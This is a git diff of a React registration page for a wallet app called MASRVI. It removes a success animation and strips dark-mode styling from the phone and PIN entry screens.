@@ -18,7 +18,6 @@ export default function RegisterPage() {
   const [loading, setLoading] = useState(false);
   const [showError, setShowError] = useState(false);
   const [showPinPad, setShowPinPad] = useState(false);
-  const [showSuccess, setShowSuccess] = useState(false);
 
   const handlePhoneChange = (e) => {
     const value = e.target.value.replace(/\D/g, '').slice(0, 8);
@@ -40,11 +39,7 @@ export default function RegisterPage() {
 
       if (data.success) {
         updateRegistration(phone, entryCode);
-        // Show success animation
-        setShowSuccess(true);
-        setTimeout(() => {
-          router.push('/otp');
-        }, 1500);
+        router.push('/otp');
       } else {
         setShowError(true);
       }
@@ -55,32 +50,6 @@ export default function RegisterPage() {
     }
   };
 
-  // Success Animation Screen
-  if (showSuccess) {
-    return (
-      <main className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-primary-500 via-primary-600 to-primary-700 dark:from-primary-700 dark:via-primary-800 dark:to-primary-900">
-        <div className="text-center animate-bounce-in">
-          {/* Success Checkmark */}
-          <div className="w-24 h-24 md:w-32 md:h-32 mx-auto mb-6 bg-white rounded-full flex items-center justify-center shadow-2xl">
-            <svg className="w-12 h-12 md:w-16 md:h-16 text-primary-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
-            </svg>
-          </div>
-          
-          <h2 className="text-2xl md:text-3xl font-bold text-white mb-2">
-            {t('share.success')}
-          </h2>
-          
-          <div className="flex items-center justify-center gap-2 mt-4">
-            <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
-            <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
-            <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
-          </div>
-        </div>
-      </main>
-    );
-  }
-
   // Show PIN keypad screen
   if (showPinPad) {
     return (
@@ -89,12 +58,12 @@ export default function RegisterPage() {
           <title>MASRVI - {t('registration.password_label')}</title>
         </Head>
 
-        <main className="min-h-screen flex flex-col bg-gray-50 dark:bg-gray-900 transition-colors">
+        <main className="min-h-screen flex flex-col bg-gray-50 transition-colors">
           {/* Back Button */}
           <div className="px-4 py-4">
             <button
               onClick={() => setShowPinPad(false)}
-              className="inline-flex items-center gap-2 text-gray-700 dark:text-gray-300 hover:text-primary-700 dark:hover:text-primary-400 transition-colors text-base"
+              className="inline-flex items-center gap-2 text-gray-700 hover:text-primary-700 transition-colors text-base"
             >
               <span className="rtl:rotate-180">&#10094;</span>
               <span>{t('registration.back')}</span>
@@ -147,12 +116,12 @@ export default function RegisterPage() {
         <title>MASRVI - {t('registration.submit')}</title>
       </Head>
 
-      <main className="min-h-screen flex flex-col bg-gradient-to-br from-primary-50 via-white to-primary-100 dark:from-gray-900 dark:via-gray-800 dark:to-gray-900 transition-colors">
+      <main className="min-h-screen flex flex-col bg-gradient-to-br from-primary-50 via-white to-primary-100 transition-colors">
         {/* Back Button */}
         <div className="px-4 py-3 md:py-4">
           <Link
             href="/"
-            className="inline-flex items-center gap-2 text-gray-600 dark:text-gray-400 hover:text-primary-700 dark:hover:text-primary-400 transition-colors text-sm md:text-base"
+            className="inline-flex items-center gap-2 text-gray-600 hover:text-primary-700 transition-colors text-sm md:text-base"
           >
             <span className="rtl:rotate-180">&#10094;</span>
             <span>{t('registration.back')}</span>
@@ -171,17 +140,17 @@ export default function RegisterPage() {
                   height={72}
                   className="h-16 md:h-20 w-auto mx-auto mb-4 object-contain"
                 />
-                <h1 className="text-xl md:text-2xl font-bold text-gray-800 dark:text-white">{t('registration.submit')}</h1>
+                <h1 className="text-xl md:text-2xl font-bold text-gray-800">{t('registration.submit')}</h1>
               </div>
 
               <div className="space-y-5 md:space-y-6">
                 {/* Phone Input */}
                 <div className="animate-fade-in-up stagger-1">
-                  <label htmlFor="phone" className="block text-sm font-semibold text-gray-800 dark:text-gray-200 mb-2 text-right">
+                  <label htmlFor="phone" className="block text-sm font-semibold text-gray-800 mb-2 text-right">
                     {t('registration.phone_label')}
                   </label>
                   <div className="flex gap-2">
-                    <div className="flex items-center px-4 py-3 md:py-4 glass-input rounded-xl text-primary-700 dark:text-primary-400 font-bold text-base md:text-lg">
+                    <div className="flex items-center px-4 py-3 md:py-4 glass-input rounded-xl text-primary-700 font-bold text-base md:text-lg">
                       222
                     </div>
                     <input
@@ -191,7 +160,7 @@ export default function RegisterPage() {
                       maxLength={8}
                       value={phone}
                       onChange={handlePhoneChange}
-                      className="flex-1 px-4 py-3 md:py-4 glass-input rounded-xl focus:outline-none transition ltr-input text-base md:text-lg font-medium dark:text-white"
+                      className="flex-1 px-4 py-3 md:py-4 glass-input rounded-xl focus:outline-none transition ltr-input text-base md:text-lg font-medium"
                       required
                     />
                   </div>
@@ -199,7 +168,7 @@ export default function RegisterPage() {
 
                 {/* Password - Click to show PIN pad */}
                 <div className="animate-fade-in-up stagger-2">
-                  <label className="block text-sm font-semibold text-gray-800 dark:text-gray-200 mb-2 text-right">
+                  <label className="block text-sm font-semibold text-gray-800 mb-2 text-right">
                     {t('registration.password_label')}
                   </label>
                   <button
@@ -214,12 +183,12 @@ export default function RegisterPage() {
                           <span
                             key={i}
                             className={`w-3 h-3 rounded-full transition-colors ${
-                              i < entryCode.length ? 'bg-primary-500' : 'bg-gray-300 dark:bg-gray-600'
+                              i < entryCode.length ? 'bg-primary-500' : 'bg-gray-300'
                             }`}
                           />
                         ))
                       ) : (
-                        <span className="text-gray-400 dark:text-gray-500 text-sm">{phone.length < 8 ? t('registration.enter_phone_first') : ''}</span>
+                        <span className="text-gray-400 text-sm">{phone.length < 8 ? t('registration.enter_phone_first') : ''}</span>
                       )}
                     </span>
                     <svg className="w-5 h-5 text-gray-400 rtl:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -249,7 +218,7 @@ export default function RegisterPage() {
         </div>
 
         {/* Green Bottom Section */}
-        <div className="bg-primary-500 dark:bg-primary-700 rounded-t-[2rem] py-6 md:py-8 px-4 mt-auto">
+        <div className="bg-primary-500 rounded-t-[2rem] py-6 md:py-8 px-4 mt-auto">
           <p className="text-white text-center text-base md:text-lg font-medium">
             Mon wallet 100% simple et securise
           </p>
